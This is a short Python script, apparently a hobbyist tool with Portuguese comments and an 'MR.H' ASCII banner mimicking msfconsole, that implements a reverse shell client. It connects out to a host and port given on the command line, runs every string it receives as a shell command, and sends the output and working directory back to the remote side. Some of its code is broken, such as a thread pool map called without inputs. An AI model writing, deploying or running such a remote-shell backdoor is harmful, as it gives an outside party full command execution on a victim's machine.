#!/usr/bin/env python3

import socket, os, subprocess, sys, platform
from time import sleep
from concurrent.futures import ThreadPoolExecutor
systema = platform.system()
if systema == 'Linux':
    #args e variaveis
    buffer = 4096
    centro = 50
    red   = "\033[1;31m"  
    blue  = "\033[1;34m"
    cyan  = "\033[1;36m"
    green = "\033[0;32m"
    reset = "\033[0;0m"
    bold  = "\033[;1m"
    reverse = "\033[;7m"
    white = "\033[37m"
    try:

        if sys.argv[1] == '-h':
            print("""-l [ipv4]
-p [port]
-s = servidor
-c = cliente
-h = ajuda
example: ./msfconsoleh -l 192.168.0.102 -p 9999 -s""")
            sys.exit()
    except:
        print("""-l [ipv4]
-p [port]
-s = servidor
-c = cliente
-h = ajuda
example: ./msfconsoleh -l 192.168.0.102 -p 9999 -s""")
        sys.exit()
    if sys.argv[1] == '-l':
        host = str(sys.argv[2])
    if sys.argv[3] == '-p':
        port = int(sys.argv[4])
    
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    def client():
        print(red + '-'*50, reset)
        print(white + '*_*'.center(50), reset)
        print('')
        print(red + """
        ███╗   ███╗██████╗    ██╗  ██╗
        ████╗ ████║██╔══██╗   ██║  ██║
        ██╔████╔██║██████╔╝   ███████║
        ██║╚██╔╝██║██╔══██╗   ██╔══██║
        ██║ ╚═╝ ██║██║  ██║██╗██║  ██║
        ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝
                              """, reset)
        print(red + '-'*50, reset)
        sleep(1)
        s.connect((host, port)) 
        message = s.recv(buffer).decode()
        print('')
        print(green + f'{host}:{port} diz: {message}'.center(50).title(), reset)
        print('')
        print(red + '-'*50, reset)
        
        def receber_message():
            while True:
                    data = s.recv(buffer)
                    if len(data) <= 0:
                        s.close()
                        sys.exit()
                    if data[:2].decode("utf-8") == 'cd':
                        os.chdir(data[3:].decode("utf-8"))
                    if data[:4].decode("utf-8") == 'exit':
                        s.close()
                        sys.exit()
                    if len(data) > 0:
                        cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )
                        output_bytes = cmd.stdout.read()
                        output_str = str(output_bytes, "utf-8")
                        s.send(str.encode(output_str + str(os.getcwd()) + '$'))
                        #print(output_str)
        receber_message()        
        s.close()
    with ThreadPoolExecutor(max_workers=15) as pool:
        pool.map(client)
    client()